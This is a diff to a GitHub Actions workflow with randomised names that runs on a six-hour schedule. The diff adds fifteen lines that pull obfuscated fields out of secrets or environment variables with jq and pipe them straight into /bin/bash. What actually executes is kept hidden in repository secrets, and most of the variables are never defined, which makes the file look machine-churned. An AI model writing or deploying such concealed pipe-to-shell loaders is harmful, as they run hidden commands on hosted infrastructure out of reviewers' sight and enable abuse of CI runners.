@@ -1,25 +1,31 @@
 name: lujingxi3456
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
+    - cron: '29 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          zk781: ${{ secrets.zk781 }}
+          hhizu72: ${{ secrets.hhizu72 }}
         run: |
-          echo $zk781 | jq -r .ameuj60806 | /bin/bash
-          echo $yv59 | jq -r .qlz994 | /bin/bash
-          echo $i46342 | jq -r .ghiv54 | /bin/bash
-          echo $bi008 | jq -r .z1 | /bin/bash
-          echo $wdl59 | jq -r .tyxio4903 | /bin/bash
-          echo $pgobc28 | jq -r .rwcjt1 | /bin/bash
-          echo $i4 | jq -r .dnhlx6 | /bin/bash
-          echo $gdi4 | jq -r .er1 | /bin/bash
-          echo $j88550 | jq -r .bzym7 | /bin/bash
+          echo $hhizu72 | jq -r .c6980 | /bin/bash
+          echo $p5 | jq -r .jsr10 | /bin/bash
+          echo $ehzr5549 | jq -r .ihh1 | /bin/bash
+          echo $msizv7 | jq -r .sqzy082 | /bin/bash
+          echo $uf60564 | jq -r .b1598 | /bin/bash
+          echo $i55 | jq -r .gmrp98 | /bin/bash
+          echo $tmole629 | jq -r .wzm98 | /bin/bash
+          echo $suxu65 | jq -r .kaekq53389 | /bin/bash
+          echo $ivwtj026 | jq -r .jr7 | /bin/bash
+          echo $mth84 | jq -r .k7194 | /bin/bash
+          echo $y4536 | jq -r .unwzi4822 | /bin/bash
+          echo $yvny95 | jq -r .fr3757 | /bin/bash
+          echo $ia2415 | jq -r .ikvuh6 | /bin/bash
+          echo $lsim6 | jq -r .sozzo14 | /bin/bash
+          echo $rf3 | jq -r .zmfza956 | /bin/bash
 
